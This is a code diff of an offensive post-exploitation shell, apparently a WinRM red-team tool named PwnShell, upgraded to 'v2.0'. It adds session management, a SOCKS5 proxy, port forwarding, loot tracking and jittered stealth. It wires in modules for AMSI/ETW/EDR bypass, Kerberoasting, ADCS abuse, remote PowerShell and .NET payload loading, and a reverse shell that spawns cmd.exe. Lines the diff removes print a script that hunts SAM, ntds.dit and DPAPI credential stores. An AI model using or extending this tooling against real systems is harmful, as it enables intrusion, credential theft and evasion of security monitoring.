@@ -1,5 +1,5 @@
 """
-shell.pwnshell — PwnShell interactive shell
+shell.pwnshell — PwnShell v2.0 Operator Interactive Shell
 """
 
 import os, sys, logging, time, textwrap, stat
@@ -20,6 +20,12 @@ except ImportError:
 
 # ── imports from sibling modules ─────────────────────────────────────────────
 from ..core.utils import strip_ansi
+from ..core.session_mgr import SessionManager
+from ..core.tunnel import Socks5Server, PortForwarder
+from ..core.loot import LootManager
+from ..core.opsec import OPSECProfile
+from ..modules import ModuleManager
+
 from .ui       import R, G, Y, B, M, C, W, DIM, BLD, RST, c, _BANNER, _COMPLETIONS
 from .ctrlc    import CtrlCHandler
 from .adtriage  import get_adtriage_ps
@@ -42,12 +48,6 @@ from .commands import (
 )
 
 
-# ─────────────────────────────────────────────────────────────────────────────
-#  COPY NGUYÊN VĂN class PwnShell từ pwnrm.py GỐC vào đây
-#  (từ dòng "class PwnShell:" đến hết method "download")
-#  KHÔNG THAY ĐỔI BẤT KỲ LOGIC NÀO BÊN TRONG CLASS
-# ─────────────────────────────────────────────────────────────────────────────
-
 # ── Session data directory ────────────────────────────────────────────────────
 # [BUG-01 & NICHE-01 FIX] Enforce 0o700 permission on _PWNRM_DIR so other local
 # users cannot read command history or transcript logs containing credentials.
@@ -68,7 +68,7 @@ try:
 except OSError:
     pass
 
-# ── PwnShell ──────────────────────────────────────────────────────────────────
+
 class PwnShell:
 
     from .. import __version__ as _pkg_version
@@ -82,6 +82,15 @@ class PwnShell:
         self.start_time  = datetime.now()
         self.target_info = target_info or {}
         self.cmd_count   = 0
+
+        # Subsystems
+        self.session_mgr = SessionManager(base_dir=_PWNRM_DIR)
+        self.session_mgr.register_session(self.runspace, getattr(self.runspace, "_transport", None), self.target_info, name="initial")
+        self.socks_server: Socks5Server | None = None
+        self.port_forwarder = PortForwarder()
+        self.loot_mgr = LootManager(base_dir=_PWNRM_DIR)
+        self.opsec_profile = OPSECProfile(mode="balanced")
+        self.module_mgr = ModuleManager()
 
         if _PTK:
             hist_path = _PWNRM_DIR / ".pwnrm_history"
@@ -103,6 +112,8 @@ class PwnShell:
 
     def __del__(self):
         self.stop_log()
+        if self.socks_server:
+            self.socks_server.stop()
 
     # ── logging ───────────────────────────────────────────────────────────────
     def start_log(self):
@@ -123,36 +134,47 @@ class PwnShell:
         elapsed = str(datetime.now() - self.start_time).split(".")[0]
         tgt = self.target_info.get("host","?")
         usr = self.target_info.get("user","?")
+        socks_status = f"{self.socks_server.bind_port} (Active)" if (self.socks_server and self.socks_server.is_running) else "Inactive"
 
         print(_BANNER)
         print(textwrap.dedent(f"""\
-        {BLD}  Session Info{RST}
-          Target  : {c(C,tgt)}
-          User    : {c(G,usr)}
-          Elapsed : {elapsed}    Commands run: {self.cmd_count}
+        {BLD}  Operator Platform Info{RST}
+          Target  : {c(C,tgt)}    User: {c(G,usr)}
+          Elapsed : {elapsed}    Commands: {self.cmd_count}    OPSEC: {c(Y, self.opsec_profile.mode.upper())}
+          SOCKS5  : {c(M, socks_status)}
 
-        {BLD}  Key Commands{RST}
+        {BLD}  Core Platform Commands (v2.0){RST}
+          {c(Y,'!session')} [list|switch|kill|rename|save|exec-all]   Multi-session manager & jump graph
+          {c(Y,'!socks')} [PORT|stop|status]                          In-band SOCKS5 proxy (default: 1080)
+          {c(Y,'!portfwd')} [LPORT RHOST:RPORT|list|stop]             Local & remote port forwarding multiplexer
+          {c(Y,'!module')} [list|run <name>]                          Extensible module & plugin subsystem
+          {c(Y,'!loot')}                                              View organized credentials & artifacts
+          {c(Y,'!opsec')} [stealth|balanced|aggressive|hybrid-cloud]  Toggle execution jitter & profile
+          {c(Y,'!playbook')} [--list|--run <name>]                    Declarative red team playbook runner
 
-          {c(Y,'!download')} RPATH [LPATH]          Pull file/dir (dirs → ZIP)
-          {c(Y,'!upload')} [-xor] LPATH [RPATH]     Push file; -xor for stealthy staging
-          {c(Y,'!amsi')}                             Patch AmsiScanBuffer in-process
-          {c(Y,'!psrun')} [-xor] URL                Load & exec remote PS1 (obfuscated ScriptBlock)
-          {c(Y,'!netrun')} [-xor] URL [ARG..]        Load & exec remote .NET assembly
-          {c(Y,'!revshell')} IP PORT                 Raw Winsock reverse shell (full I/O)
-          {c(Y,'!adtriage')} [-q]                    AD post-auth recon:
-                                               SPNs · AS-REP · delegation · ADCS·
-                                               gMSA/dMSA · ACL quick-wins · BadSuccessor
-          {c(Y,'!shares')} [-q] [HOST..]              {c(M,'[NEW]')} SMB share scout:
-                                               UNC access · ACLs · SYSVOL GPP · writable shares
-          {c(Y,'!sessions')} [-q]                    {c(M,'[NEW]')} Session & network snapshot:
-                                               logon sessions · Kerberos tickets · TCP conns · pipes
-          {c(Y,'!sysinfo')}                          Quick OS / AV / hotfix snapshot
-          {c(Y,'!creds')}                            DPAPI / PowerShell history / credential hint
-          {c(Y,'!log')} / {c(Y,'!stoplog')}                  Toggle session transcript
-          exit / quit / Ctrl+D               Close session
-          Ctrl+C                             Gracefully interrupt running command
+        {BLD}  Identity & Active Directory Abuse (2026-2027 TTPs){RST}
+          {c(Y,'!adcs')} [-q|--template <T>|--wsus]                  Full ADCS ESC1-ESC17+ engine (WSUS/Triage)
+          {c(Y,'!kerberos')} [--roast|--asrep|--dmsa|--diamond]      AES Kerberoast, AS-REP & dMSA suite
+          {c(Y,'!entra')} [-s]                                       Hybrid Entra ID / Azure AD PRT pivot
+          {c(Y,'!creds')} [--vault|--dpapi|--history]                Deep credential & token artifact hunter
+          {c(Y,'!bloodhound')} [-c <methods>]                        In-memory AD graph collector (BloodHound)
+          {c(Y,'!lateral')} [--subnet <s>]                           Subnet scout & lateral movement engine
 
-        {c(DIM,'  Tab-completion available for all ! commands.')}
+        {BLD}  Recon, Staging & Evasion{RST}
+          {c(Y,'!evasion')} [--edr|--amsi|--etw]                     Polymorphic AMSI/ETW bypass & EDR scout
+          {c(Y,'!adtriage')} [-q]                                    AD post-auth quick triage
+          {c(Y,'!shares')} [-q] [HOST..]                             SMB share permission mapper
+          {c(Y,'!sessions')} [-q]                                    Logon sessions & network snapshot
+          {c(Y,'!sysinfo')}                                          Quick OS / AV / hotfix snapshot
+          {c(Y,'!download')} RPATH [LPATH]                           Pull file/dir (dirs -> ZIP)
+          {c(Y,'!upload')} [-xor] LPATH [RPATH]                      Push file (-xor for stealth)
+          {c(Y,'!amsi')}                                             Patch AmsiScanBuffer in-process
+          {c(Y,'!psrun')} [-xor] URL                                 Load & exec remote PS1
+          {c(Y,'!netrun')} [-xor] URL [ARG..]                        Load & exec remote .NET assembly
+          {c(Y,'!revshell')} IP PORT                                 Raw Winsock reverse shell
+
+          {c(Y,'!log')} / {c(Y,'!stoplog')}                                  Toggle session transcript
+          exit / quit / Ctrl+D                                       Close session
         """))
 
     # ── REPL ──────────────────────────────────────────────────────────────────
@@ -164,12 +186,28 @@ class PwnShell:
             if not cmd:
                 continue
             self.cmd_count += 1
+            self.opsec_profile.jitter_sleep()
 
             if cmd in {"exit","quit","!exit","!quit"}:
                 print(c(DIM, "\n  [~] Session closed. Stay stealthy.\n"))
                 return
 
             dispatch = [
+                ("!session",    self._session_dispatch),
+                ("!socks",      self._socks_dispatch),
+                ("!portfwd",    self._portfwd_dispatch),
+                ("!rportfwd",   self._portfwd_dispatch),
+                ("!module",     self._module_dispatch),
+                ("!loot",       lambda _: self._loot_dispatch()),
+                ("!opsec",      self._opsec_dispatch),
+                ("!playbook",   self._playbook_dispatch),
+                ("!adcs",       lambda args: self.module_mgr.get_module("adcs").run(self, split_args(args))),
+                ("!kerberos",   lambda args: self.module_mgr.get_module("kerberos").run(self, split_args(args))),
+                ("!entra",      lambda args: self.module_mgr.get_module("entra").run(self, split_args(args))),
+                ("!creds",      lambda args: self.module_mgr.get_module("creds").run(self, split_args(args))),
+                ("!bloodhound", lambda args: self.module_mgr.get_module("bloodhound").run(self, split_args(args))),
+                ("!lateral",    lambda args: self.module_mgr.get_module("lateral").run(self, split_args(args))),
+                ("!evasion",    lambda args: self.module_mgr.get_module("evasion").run(self, split_args(args))),
                 ("!download ",  self.download),
                 ("!upload ",    self.upload),
                 ("!amsi",       lambda _: self.amsi_bypass()),
@@ -180,7 +218,6 @@ class PwnShell:
                 ("!shares",     self._shares_dispatch),
                 ("!sessions",   self._sessions_dispatch),
                 ("!sysinfo",    lambda _: self.sysinfo()),
-                ("!creds",      lambda _: self.creds_hint()),
                 ("!log",        lambda _: self.start_log()),
                 ("!stoplog",    lambda _: self.stop_log()),
             ]
@@ -188,7 +225,8 @@ class PwnShell:
             matched = False
             for prefix, fn in dispatch:
                 if cmd.lower().startswith(prefix.lower()):
-                    fn(cmd[len(prefix):].strip())
+                    arg_str = cmd[len(prefix):].strip()
+                    fn(arg_str)
                     matched = True
                     break
 
@@ -209,7 +247,9 @@ class PwnShell:
     def read_line(self):
         while True:
             try:
-                ps_pre = f"{BLD}{M}PwnRM{RST}|{c(C,self.cwd)}> "
+                cur_node = self.session_mgr.get_current()
+                sid_str = f"S:{cur_node.session_id}|" if cur_node else ""
+                ps_pre = f"{BLD}{M}PwnRM{RST}[{c(Y, sid_str + self.target_info.get('host','?'))}]|{c(C,self.cwd)}> "
                 if _PTK:
                     cmd = prompt(ANSI(ps_pre), history=self.prompt_history,
                                  completer=self._completer,
@@ -289,33 +329,153 @@ class PwnShell:
         return False
 
     # ══════════════════════════════════════════════════════════════════════════
+    #  DISPATCHERS FOR NEW V2.0 PLATFORM SUBSYSTEMS
+    # ══════════════════════════════════════════════════════════════════════════
+
+    def _session_dispatch(self, args_str: str):
+        args = split_args(args_str)
+        subcmd = args[0].lower() if args else "list"
+        if subcmd == "list":
+            sessions = self.session_mgr.list_sessions()
+            self.write_info(c(C + BLD, "\n  [Active PwnRM Sessions]"))
+            for s in sessions:
+                cur_marker = c(G, " [*]") if s["is_current"] else "    "
+                self.write_info(f"{cur_marker} ID: {c(Y, str(s['id']))} | Name: {s['name']} | Host: {s['host']} | User: {s['user']}")
+            print()
+        elif subcmd == "switch" and len(args) > 1:
+            try:
+                sid = int(args[1])
+                if self.session_mgr.switch_session(sid):
+                    node = self.session_mgr.get_current()
+                    self.runspace = node.runspace
+                    self.target_info = node.target_info
+                    self.update_cwd()
+                    self.write_info(c(G, f"  [+] Switched to session {sid} ({node.host})"))
+                else:
+                    self.write_warning(f"Session {sid} not found.")
+            except ValueError:
+                self.write_warning("Session ID must be an integer.")
+        elif subcmd == "save":
+            fn = self.session_mgr.save_state()
+            self.write_info(c(G, f"  [+] Session state saved securely to {fn}"))
+        elif subcmd == "exec-all" and len(args) > 1:
+            fan_cmd = " ".join(args[1:])
+            res = self.session_mgr.fan_out_exec(fan_cmd)
+            for sid, out in res.items():
+                self.write_info(c(Y, f"--- Session {sid} Output ---"))
+                self.write_info(out)
+        else:
+            self.write_warning("Usage: !session [list | switch <id> | save | exec-all <cmd>]")
+
+    def _socks_dispatch(self, args_str: str):
+        args = split_args(args_str)
+        if not args or args[0].isdigit():
+            port = int(args[0]) if args else 1080
+            if self.socks_server and self.socks_server.is_running:
+                self.write_warning(f"SOCKS5 already running on port {self.socks_server.bind_port}. Stop it first (!socks stop).")
+                return
+            self.socks_server = Socks5Server(bind_host="127.0.0.1", bind_port=port)
+            self.socks_server.start()
+            self.write_info(c(G, f"  [+] In-band SOCKS5 Proxy started on 127.0.0.1:{port}"))
+        elif args[0].lower() == "stop":
+            if self.socks_server:
+                self.socks_server.stop()
+                self.socks_server = None
+                self.write_info(c(Y, "  [*] SOCKS5 Proxy stopped."))
+            else:
+                self.write_warning("No active SOCKS5 proxy.")
+        elif args[0].lower() == "status":
+            if self.socks_server and self.socks_server.is_running:
+                self.write_info(c(G, f"  [+] SOCKS5 Proxy ACTIVE on {self.socks_server.bind_host}:{self.socks_server.bind_port} ({len(self.socks_server.active_tunnels)} active connections)"))
+            else:
+                self.write_info("  [-] SOCKS5 Proxy is INACTIVE.")
+
+    def _portfwd_dispatch(self, args_str: str):
+        args = split_args(args_str)
+        if not args or args[0].lower() == "list":
+            forwards = self.port_forwarder.list_forwards()
+            self.write_info(c(C + BLD, "\n  [Active Port Forwards]"))
+            if not forwards:
+                self.write_info("    (No active port forwards)")
+            for f in forwards:
+                self.write_info(f"    ID: {f['id']} | Bind: {f['bind']} -> Target: {f['target']}")
+            print()
+        elif len(args) >= 2:
+            try:
+                lport = int(args[0])
+                rhost, rport = args[1].split(":")
+                fid = self.port_forwarder.start_local_forward(lport, rhost, int(rport))
+                self.write_info(c(G, f"  [+] Port forward created (ID: {fid}): 127.0.0.1:{lport} -> {rhost}:{rport}"))
+            except Exception as e:
+                self.write_error(f"Failed to create port forward: {e}")
+        else:
+            self.write_warning("Usage: !portfwd <LPORT> <RHOST>:<RPORT> or !portfwd list")
+
+    def _module_dispatch(self, args_str: str):
+        args = split_args(args_str)
+        if not args or args[0].lower() == "list":
+            mods = self.module_mgr.list_modules()
+            self.write_info(c(C + BLD, "\n  [Registered PwnRM Modules]"))
+            for m in mods:
+                self.write_info(f"    - {c(Y, m['name']):<15} {m['description']}")
+            print()
+        elif args[0].lower() == "run" and len(args) > 1:
+            mod_name = args[1]
+            mod = self.module_mgr.get_module(mod_name)
+            if mod:
+                mod.run(self, args[2:])
+            else:
+                self.write_warning(f"Module '{mod_name}' not found. Use '!module list'.")
+        else:
+            self.write_warning("Usage: !module list or !module run <name> [args]")
+
+    def _loot_dispatch(self):
+        summary = self.loot_mgr.summary()
+        self.write_info(c(C + BLD, "\n  [PwnRM Structured Loot Inventory]"))
+        if not summary:
+            self.write_info(f"    (No loot recorded yet under {_PWNRM_DIR / 'loot'})")
+        for target, data in summary.items():
+            self.write_info(f"  Target: {c(Y, target)}")
+            creds = data.get("credentials", [])
+            self.write_info(f"    Credentials: {len(creds)} entries")
+            for c_ in creds[:5]:
+                self.write_info(f"      - [{c_['type']}] {c_['account']} ({c_['source']})")
+            artifacts = data.get("artifacts", {})
+            for cat, items in artifacts.items():
+                if items:
+                    self.write_info(f"    {cat.capitalize()}: {len(items)} files ({', '.join(items[:3])})")
+        print()
+
+    def _opsec_dispatch(self, args_str: str):
+        args = split_args(args_str)
+        if args and args[0].lower() in OPSECProfile.PROFILES:
+            self.opsec_profile.set_mode(args[0].lower())
+            self.write_info(c(G, f"  [+] Active OPSEC profile set to: {self.opsec_profile.mode.upper()}"))
+        else:
+            self.write_info(f"Active profile: {c(Y, self.opsec_profile.mode.upper())}")
+            self.write_info("Available profiles: stealth, balanced, aggressive, hybrid-cloud")
+
+    def _playbook_dispatch(self, args_str: str):
+        args = split_args(args_str)
+        self.module_mgr.get_module("playbook").run(self, args)
+
+    # ══════════════════════════════════════════════════════════════════════════
     #  BUILT-IN COMMANDS
     # ══════════════════════════════════════════════════════════════════════════
 
-    # ── !adtriage (NEW in v1.0.1) ─────────────────────────────────────────────
+    # ── !adtriage ─────────────────────────────────────────────────────────────
     def _adtriage_dispatch(self, args):
         quick = "-q" in args.lower() or "--quick" in args.lower()
         self.adtriage(quick=quick)
 
     def adtriage(self, quick=False):
-        """
-        AD Triage — runs an entirely self-contained PowerShell enumeration
-        inside the remote session.  No extra binaries needed on target.
-        Covers: identity, domain basics, HV groups, Kerberoast, AS-REP,
-        unconstrained/constrained/RBCD delegation, ADCS (ESC1/3/4 quick scan),
-        gMSA/dMSA (BadSuccessor hint), ACL quick-wins, pre-2000 compat access,
-        and accounts with password-never-expires + adminCount=1.
-        """
         self.write_info(c(M+BLD, "  [*] PwnRM AD Triage — loading remote enumeration module..."))
         ps = get_adtriage_ps(quick=quick)
-        # Inject as a ScriptBlock to stay under AMSI radar
         encoded = b64str(ps.encode("utf-16le"))
-        cmd = f"powershell -NonInteractive -EncodedCommand {encoded}"
-        # Prefer direct Invoke-Expression so the output streams correctly
         cmd = f"Invoke-Expression ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('{encoded}')))"
         self.run_with_interrupt(cmd, self.write_line)
 
-    # ── !shares (NEW in v1.2.0) ──────────────────────────────────────────────
+    # ── !shares ──────────────────────────────────────────────────────────────
     def _shares_dispatch(self, args: str):
         parts = args.split()
         quick = False
@@ -328,40 +488,18 @@ class PwnShell:
         self.shares(quick=quick, targets=targets)
 
     def shares(self, quick: bool = False, targets: list[str] | None = None):
-        """
-        Share Scout — SMB share enumeration + permission mapping executed
-        entirely inside the remote PowerShell session.
-        Covers: local shares, UNC access tests (read/write), ACL quick-wins,
-        SYSVOL/NETLOGON sensitive file scan (GPP cPassword detection),
-        open files, and active SMB sessions.
-
-        Usage: !shares [-q] [HOST1 HOST2 ...]
-          -q / --quick  Identity + local shares + quick UNC probe only
-          HOST ..       Explicit targets (default: localhost + AD discovery)
-        """
         self.write_info(c(M+BLD, "  [*] PwnRM Share Scout — loading remote enumeration module..."))
         ps = get_shares_ps(quick=quick, targets=targets or [])
         encoded = b64str(ps.encode("utf-16le"))
         cmd = f"Invoke-Expression ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('{encoded}')))"
         self.run_with_interrupt(cmd, self.write_line)
 
-    # ── !sessions (NEW in v1.2.0) ────────────────────────────────────────────
+    # ── !sessions ────────────────────────────────────────────────────────────
     def _sessions_dispatch(self, args: str):
         quick = "-q" in args.lower() or "--quick" in args.lower()
         self.sessions(quick=quick)
 
     def sessions(self, quick: bool = False):
-        """
-        Session Scout — active logon session + network connection snapshot
-        executed entirely inside the remote PowerShell session.
-        Covers: interactive/remote logon sessions, RDP client MRU,
-        Kerberos ticket cache (klist), established TCP connections,
-        listening ports with service identification, named pipe exposure,
-        and SYSTEM-level scheduled tasks.
-
-        Usage: !sessions [-q]
-          -q / --quick  Logon sessions + RDP MRU only (no network/pipe scan)
-        """
         self.write_info(c(M+BLD, "  [*] PwnRM Session Scout — loading remote enumeration module..."))
         ps = get_sessions_ps(quick=quick)
         encoded = b64str(ps.encode("utf-16le"))
@@ -372,56 +510,24 @@ class PwnShell:
     def sysinfo(self):
         self.write_info(c(C, "  [*] System snapshot"))
         cmds = [
-            # OS / hostname / build
             'Write-Host "`n[OS]"; $o=Get-WmiObject Win32_OperatingSystem;'
             '"  Name     : "+$o.Caption; "  Build    : "+$o.BuildNumber;'
             '"  Hostname : "+$env:COMPUTERNAME; "  Domain   : "+$env:USERDNSDOMAIN',
-            # Hotfixes (last 10)
             'Write-Host "`n[Hotfixes (last 10)]";'
             'Get-HotFix | Sort InstalledOn -Desc | Select -First 10 | '
             'ForEach-Object { "  "+$_.HotFixID+" "+$_.Description+" "+$_.InstalledOn }',
-            # AV products
             'Write-Host "`n[AV Products]";'
             'try { Get-WmiObject -Namespace root\\SecurityCenter2 -Class AntiVirusProduct |'
             'ForEach-Object { "  "+$_.displayName } } catch { "  (SecurityCenter2 not available)" }',
-            # Local admins
             'Write-Host "`n[Local Administrators]";'
             'net localgroup administrators 2>$null | Select-Object -Skip 6 | '
             'Where-Object { $_ -and $_ -notmatch "----" } | ForEach-Object { "  "+$_ }',
-            # WinRM / SMB signing
             'Write-Host "`n[WinRM / SMB]";'
             '"  WinRM port : 5985/5986";'
             'try { $s=Get-SmbServerConfiguration; "  SMB Signing Required: "+$s.RequireSecuritySignature } catch {}',
         ]
         for c_ in cmds:
             self.run_with_interrupt(c_, self.write_line)
-
-    # ── !creds (DPAPI / history hints) ───────────────────────────────────────
-    def creds_hint(self):
-        self.write_info(c(C, "  [*] Credential artifact hints"))
-        ps = r"""
-$targets = @(
-    "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt",
-    "$env:APPDATA\Microsoft\Credentials",
-    "$env:LOCALAPPDATA\Microsoft\Credentials",
-    "$env:APPDATA\Microsoft\Protect",
-    "C:\Windows\System32\config\SAM",
-    "C:\Windows\NTDS\ntds.dit",
-    "C:\inetpub\wwwroot\web.config",
-    "C:\Windows\Panther\unattend.xml",
-    "C:\ProgramData\McAfee\Agent\DB\ma.db"
-)
-foreach ($t in $targets) {
-    if (Test-Path $t -ErrorAction SilentlyContinue) {
-        Write-Host "  [+] FOUND: $t" -ForegroundColor Green
-    }
-}
-# Check for saved credentials
-$creds = cmdkey /list 2>$null
-if ($creds -match "Target") { Write-Host "`n  [!] cmdkey entries:" -ForegroundColor Yellow; $creds | Write-Host }
-Write-Host "`n  [-] Run !amsi then !netrun with DonPAPI/SharpDPAPI for full DPAPI dump"
-"""
-        self.run_with_interrupt(ps, self.write_line)
 
     # ── !amsi ─────────────────────────────────────────────────────────────────
     def amsi_bypass(self):
@@ -443,9 +549,6 @@ Write-Host "`n  [-] Run !amsi then !netrun with DonPAPI/SharpDPAPI for full DPAP
     # ── !psrun ────────────────────────────────────────────────────────────────
     def psrun(self, cmdline):
         args   = split_args(cmdline)[:2]
-        # [BUG-04 FIX] Guard empty args before any args[n] access.
-        # '!psrun ' (trailing space, no URL) yields args=[] -> IndexError.
-        # Same pattern fixed in netrun/upload; psrun was missed.
         if not args:
             self.write_warning("usage: !psrun [-xor] URL"); return
         url    = args[-1]
@@ -520,7 +623,7 @@ Write-Host "`n  [-] Run !amsi then !netrun with DonPAPI/SharpDPAPI for full DPAP
             f"{_call_CreateProcess}(0,'cmd.exe',0,0,1,0,0,0,$sinfo,(New-Object byte[] 32))",
             "Remove-Variable @('sock','sinfo')"
         ]
-        self.write_info(c(Y, f"  [*] Spawning reverse shell → {args[0]}:{args[1]}"))
+        self.write_info(c(Y, f"  [*] Spawning reverse shell -> {args[0]}:{args[1]}"))
         for cmd in cmds:
             logging.debug(cmd); self.run_with_interrupt(cmd, self.write_line)
 
@@ -531,9 +634,6 @@ Write-Host "`n  [-] Run !amsi then !netrun with DonPAPI/SharpDPAPI for full DPAP
             self.write_warning("usage: !upload [-xor] LPATH [RPATH]"); return
         if args[0].lower() == "-xor":
             unxor = False; args = args[1:]
-            # [BUG-06 FIX] Guard empty args after -xor strip.
-            # '!upload -xor' (no LPATH) leaves args=[] -> IndexError on args[0].
-            # netrun() already had this guard (len==1 check); upload() did not.
             if not args:
                 self.write_warning("usage: !upload [-xor] LPATH [RPATH]"); return
         else:
@@ -552,7 +652,7 @@ Write-Host "`n  [-] Run !amsi then !netrun with DonPAPI/SharpDPAPI for full DPAP
             temp_validated = "C:\\Windows\\Temp\\"
         tmpfn = self._pse(temp_validated) + randbytes(8).hex() + ".tmp"
         total = 0
-        self.write_info(f"  [~] Uploading → {c(C,str(tmpfn))}")
+        self.write_info(f"  [~] Uploading -> {c(C,str(tmpfn))}")
         self.run_sync(import_XorEnc)
         for chunk in chunks(buf, 65536):
             total += len(chunk)
@@ -571,6 +671,7 @@ Write-Host "`n  [-] Run !amsi then !netrun with DonPAPI/SharpDPAPI for full DPAP
             self.write_error("  Upload integrity check FAILED — file may be corrupted!")
         else:
             self.write_info(c(G, "  [+] Upload complete — MD5 verified."))
+
     @staticmethod
     def _pse(path) -> str:
         """Escape single quotes for safe PS single-quoted string embedding."""
@@ -581,13 +682,11 @@ Write-Host "`n  [-] Run !amsi then !netrun with DonPAPI/SharpDPAPI for full DPAP
         """
         Escape a path for embedding inside a PowerShell double-quoted string.
         Escapes: backtick (must be first), dollar sign, double-quote.
-        [CRIT-01] Prevents command injection when server-controlled paths are
-        placed inside double-quoted PS strings (e.g. Copy-Item "...\\$d").
         """
         s = str(path)
-        s = s.replace('`', '``')   # backtick first — PS escape character
-        s = s.replace('$', '`$')   # prevent variable/subexpression expansion
-        s = s.replace('"', '`"')   # prevent string termination
+        s = s.replace('`', '``')
+        s = s.replace('$', '`$')
+        s = s.replace('"', '`"')
         return s
 
     # ── safe Windows path validator ───────────────────────────────────────────
@@ -598,24 +697,11 @@ Write-Host "`n  [-] Run !amsi then !netrun with DonPAPI/SharpDPAPI for full DPAP
 
     @classmethod
     def _validate_remote_path(cls, path: str) -> str:
-        """
-        Validates a raw path string returned from the remote WinRM server
-        before it is embedded into any local PowerShell string context.
-
-        [HIGH-01] A malicious WinRM server can return a Resolve-Path response
-        containing PS-injection characters. This method whitelists the path to
-        a strict 'drive-letter:\\rest' pattern, blocking any special characters
-        that could break out of PS string embedding.
-
-        Raises ValueError with a clear message so callers can surface it to
-        the operator instead of silently executing injected code.
-        """
         stripped = path.strip()
         if not cls._SAFE_WIN_PATH_RE.match(stripped):
             raise ValueError(
                 f"Remote path failed safety validation: {stripped!r}\n"
-                "  The WinRM server returned a path containing unsafe characters.\n"
-                "  This may indicate a malicious or compromised target."
+                "  The WinRM server returned a path containing unsafe characters."
             )
         return stripped
 
@@ -625,40 +711,28 @@ Write-Host "`n  [-] Run !amsi then !netrun with DonPAPI/SharpDPAPI for full DPAP
         if not args or len(args) > 2:
             self.write_warning("usage: !download RPATH [LPATH]"); return
 
-        # [GHSA-x4cv-p53p-wh3w - SECURITY FIX 1] Lấy tên file từ CHÍNH INPUT CỦA USER (args[0]).
-        # Tuyệt đối không dùng src.name do server trả về để tránh bị spoof tên file độc hại.
         user_rpath = PureWindowsPath(args[0])
         safe_filename = user_rpath.name
-        
-        # Fallback nếu user truyền đường dẫn root (vd: "C:\") thì không có tên file
         if not safe_filename:
             safe_filename = "downloaded_file"
 
-        # Giữ nguyên logic query server để lấy đường dẫn thật (dùng cho logging và check directory)
         src_raw = self.run_sync(f"Resolve-Path -LiteralPath '{self._pse(args[0])}' | Select -Expand Path")
         if not src_raw:
             self.write_warning(f"{args[0]} not found on remote"); return
 
-        # [HIGH-01] Validate the server-returned path against a strict whitelist before
-        # embedding it into any PS string. Rejects paths with injection characters
-        # ($, `, ", |, &, etc.) that could break out of PS string context.
         try:
             src_validated = self._validate_remote_path(src_raw)
         except ValueError as e:
             self.write_error(str(e)); return
 
         src    = PureWindowsPath(src_validated)
-        src_ps = self._pse(src)   # for single-quoted PS strings
-        src_pde = self._pde(src)  # [CRIT-01] for double-quoted PS string context
+        src_ps = self._pse(src)
+        src_pde = self._pde(src)
 
-        
-        # [GHSA-x4cv-p53p-wh3w - SECURITY FIX 2] Build đường dẫn local dựa trên safe_filename thay vì src.name
         dst = Path(args[1]) if len(args) == 2 else Path(safe_filename)
         if dst.is_dir(): 
             dst = dst / safe_filename
             
-        # [DEFENSE IN DEPTH] Chặn local path traversal nếu user lỡ gõ ".." vào LPATH
-        # (Mặc dù CLI thường cho phép, nhưng chặn ở mức filename để an toàn hơn)
         if '..' in dst.name:
             self.write_error("Invalid characters ('..') in destination filename."); return
 
@@ -667,7 +741,6 @@ Write-Host "`n  [-] Run !amsi then !netrun with DonPAPI/SharpDPAPI for full DPAP
 
         is_dir = self.run_sync(f"Test-Path -Path '{src_ps}' -PathType Container") == "True"
         if is_dir:
-            # Logic tải thư mục vẫn hoạt động bình thường với safe_filename
             if not dst.name.lower().endswith(".zip"): 
                 dst = dst.parent / f"{dst.name}.zip"
                 
@@ -679,8 +752,6 @@ Write-Host "`n  [-] Run !amsi then !netrun with DonPAPI/SharpDPAPI for full DPAP
             tmpdir    = self._pse(tmpdir_validated)
             tmpnm     = randbytes(8).hex()
             tmpfn     = tmpdir + tmpnm
-            # [CRIT-01] tmpfn is embedded in a double-quoted PS string below;
-            # _pde() escapes $, ` and " to prevent injection from a rogue GetTempPath response.
             tmpfn_pde = self._pde(tmpdir + tmpnm)
             ps = f"""
 Add-Type -AssemblyName "System.IO.Compression.FileSystem"
@@ -700,10 +771,6 @@ Remove-Item -Recurse -Force -Path '{tmpfn}'
 """
             self.run_with_interrupt(ps, self.write_line)
             src    = tmpfn + ".zip"
-            # [BUG-05 FIX] src was reassigned to the remote zip path but src_ps
-            # was never updated — Download-Remote would OpenRead the original
-            # directory (fails on Windows) and Remove-Item would delete the
-            # original directory instead of the zip temp file.
             src_ps = self._pse(src)
 
         ps = f"""function Download-Remote {{
@@ -719,7 +786,6 @@ Remove-Item Function:Download-Remote
 """
         self.write_info(f"  [~] Streaming {c(C,str(src))} ...")
         buf = bytearray()
-        # [HIGH-04 FIX] Enforce memory cap to prevent OOM DoS
         max_bytes = int(os.environ.get("PWNRM_MAX_DL", 256 * 1024 * 1024))
 
         def collect(out):
@@ -739,7 +805,6 @@ Remove-Item Function:Download-Remote
         self.run_with_interrupt(ps, collect)
 
         if is_dir: self.run_sync(f"Remove-Item -fo '{src_ps}'")
-        # [BUG-02 FIX] Guard against truncated response (< 32 bytes MD5 trailer).
         if len(buf) < 32:
             self.write_error(
                 f"  Download failed: server returned {len(buf)} bytes "
